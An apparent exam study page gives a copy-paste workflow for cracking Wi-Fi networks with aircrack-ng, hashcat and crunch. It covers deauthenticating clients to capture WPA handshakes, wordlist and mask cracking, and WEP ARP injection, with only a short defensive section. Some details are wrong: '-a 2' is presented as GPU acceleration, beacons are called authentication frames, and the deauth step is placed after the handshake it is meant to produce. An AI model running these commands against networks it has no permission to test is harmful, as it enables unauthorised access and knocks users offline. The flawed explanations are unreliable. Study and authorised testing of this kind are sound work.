---
layout: default
title: Commands
parent: Domain 7 - Wireless Network Cracking
grand_parent: Domains
nav_order: 1
---

# Domain 7: Wireless Commands Reference

## Critical: Aircrack-ng Complete Workflow

### Phase 1: Interface Setup & Monitor Mode

```bash
# Kill processes that interfere
sudo airmon-ng check kill

# Enable monitor mode on wireless interface
sudo airmon-ng start wlan0
# Creates: wlan0mon (or wlan0-mon depending on driver)

# Verify monitor mode
iwconfig wlan0mon
# Should show "Mode:Monitor"

# Check available channels (optional)
iwlist wlan0mon channel
```

### Phase 2: Network Scanning & BSSID Discovery

```bash
# Scan for all WiFi networks
sudo airodump-ng wlan0mon

# Output columns:
# BSSID           = Router MAC address (target this with -a)
# PWR             = Signal strength (-30 is strong, -80 is weak)
# Beacons         = Authentication frames sent
# DATA            = Captured data packets
# CH              = WiFi Channel (crucial for capture)
# ESSID           = Network name (SSID)

# Look for: WPA/WPA2 networks (avoid WEP, Open networks)

# Targeted scan for specific SSID
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

### Phase 3: Target-Specific Capture & Handshake Capture

```bash
# Start capturing traffic from target (CRITICAL FOR EXAM)
sudo airodump-ng \
  -c CHANNEL \
  --bssid TARGET_BSSID \
  -w capture \
  wlan0mon

# Example:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Keep this terminal open - watch for "WPA handshake: AA:BB:CC:DD:EE:FF"
```

### Phase 4: Force Client to Reconnect (Deauthentication Attack)

```bash
# In ANOTHER terminal (while airodump-ng is running):
# This FORCES the client to re-authenticate, capturing the 4-way handshake

# Deauth all clients from target AP
sudo aireplay-ng \
  --deauth 10 \
  -a TARGET_BSSID \
  wlan0mon

# Deauth specific client (faster)
sudo aireplay-ng \
  --deauth 10 \
  -a TARGET_BSSID \
  -c CLIENT_MAC \
  wlan0mon

# Parameters:
# --deauth 10      = Send 10 deauth packets
# -a TARGET_BSSID  = Target AP (router)
# -c CLIENT_MAC    = Specific client (optional, leave out for broadcast)

# Example:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

### Phase 5: Verify Handshake Captured

```bash
# Method 1: Check airodump-ng window
# Look for text: "WPA handshake: AA:BB:CC:DD:EE:FF"
# Once you see this, handshake is captured

# Method 2: Analyze capture file with aircrack-ng
sudo aircrack-ng capture-01.cap
# Output should show:
# [*] Target network found: TargetNetwork
# [*] WPA2 handshake found

# Method 3: Convert to JSON & verify
sudo aircrack-ng -J capture.json capture-01.cap
# If output mentions "WPA2 handshake(s) found" = SUCCESS
```

### Phase 6: Crack Password - Dictionary Attack

```bash
# Standard wordlist attack (SLOWEST on CPU)
sudo aircrack-ng \
  -w /path/to/wordlist.txt \
  -b TARGET_BSSID \
  capture-01.cap

# Example:
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# GPU-accelerated cracking (MUCH FASTER)
sudo aircrack-ng \
  -w wordlist.txt \
  -a 2 \
  capture-01.cap

# Common wordlists:
/usr/share/wordlists/rockyou.txt (500M lines)
/usr/share/wordlists/10k_most_common.txt (small, fast)

# Success output:
# KEY FOUND! [ PASSWORD_HERE ]
```

---

## Advanced Handshake Troubleshooting

### Problem: No Handshake Captured

```bash
# 1. Client may already be connected - force reconnection
# Increase deauth packets
sudo aireplay-ng --deauth 50 -a TARGET_BSSID wlan0mon

# 2. Wrong channel - verify with airodump-ng initial scan
airodump-ng wlan0mon  # Note the CH column for target

# 3. Monitor mode not working - try different driver
# Some cards need airmon-ng stop/start cycle
sudo airmon-ng stop wlan0mon
sudo airmon-ng start wlan0 6  # Specify channel

# 4. Too far away - signal weak - move closer or use antenna
```

### Verify Handshake Before Cracking

```bash
# Best practice: verify BEFORE wasting time cracking

# Method 1: Tshark (from Wireshark)
tshark -r capture-01.cap -Y "eapol" | head -20
# Should show EAPOL frames (4-way handshake packets)

# Method 2: Cowpatty (dedicated handshake check)
cowpatty -r capture-01.cap -c
# "Passphrase not in dictionary" = HANDSHAKE VALID
# "No valid passphrase found" could mean no handshake

# Method 3: Hashcat
# Extract PMK and verify
```

---

## Alternative Cracking Methods (If Dictionary Fails)

### Brute Force with Mask Attack (Hashcat)

```bash
# If wordlist doesn't work, try mask attack
# ?u = uppercase, ?l = lowercase, ?d = digit, ?s = special

# Mask: 8-character password, all lowercase + numbers
hashcat -m 22000 capture.hc22000 -a 3 ?l?l?l?l?d?d?d?d

# Mask: Common pattern (capital + 7 lowercase)
hashcat -m 22000 capture.hc22000 -a 3 ?u?l?l?l?l?l?l?l

# Convert aircrack capture to hashcat format first
aircrack-ng -J capture.json capture-01.cap
# Then convert JSON to .hc22000 format
```

### Custom Wordlist Generation

```bash
# If target password unknown, generate likely words
crunch 8 8 0123456789 > numbers.txt
crunch 8 8 -t @@@@@@@? -o words.txt  # Pattern-based

# Combine existing lists
cat list1.txt list2.txt > combined.txt

# Remove duplicates
sort combined.txt | uniq > deduped.txt
```

---

## WEP Cracking (Legacy - Not on Modern Exams)

```bash
# WEP is deprecated but may appear in challenges
# Much faster than WPA2 due to weak encryption

# Capture
sudo airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon

# Inject ARP packets to generate IVs
sudo aireplay-ng -3 -b TARGET_BSSID -h MAC_ADDRESS wlan0mon

# Crack (requires many IVs, usually <1 minute)
sudo aircrack-ng capture-01.cap

# Output: KEY FOUND! [ KEY_HERE ]
```

---

## Monitoring & Defensive Checks

### Monitor for Deauth Attacks on Your Network

```bash
# Install and run Wireshark
wireshark

# Filter for deauthentication frames
filter: wlan.fc.type_subtype == 0x0c

# Look for excessive deauth packets
# Indicates someone is forcing reconnections (attack in progress)
```

### Check Your Network for WPA2 Vulnerabilities

```bash
# List networks and security type
sudo iwlist wlan0 scan | grep -E "ESSID|Group Cipher|Pairwise"

# Use Wifite (automated testing)
sudo wifite -all -wpa
```

---

## Quick Reference - Copy-Paste Commands

### Full Attack Sequence (Terminal 1)

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

### Full Attack Sequence (Terminal 2 - After seeing WPA handshake)

```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Cracking (Terminal 1 or 3 - After handshake confirmed)

```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

---

## Exam Tips for Domain 7

1. **Handshake is EVERYTHING** - 80% of failures = no handshake
2. **Wait for handshake** before cracking - don't guess or waste time
3. **Use deauth** - it FORCES reconnection, capturing the handshake
4. **Verify before cracking** - saves hours of wasted attempts
5. **Channel matters** - wrong channel = no data captured
6. **Keep monitor mode stable** - some drivers disconnect after ~2 minutes

---

**Last Updated:** July 9, 2026  
**Priority:** CRITICAL - Study this for exam tomorrow
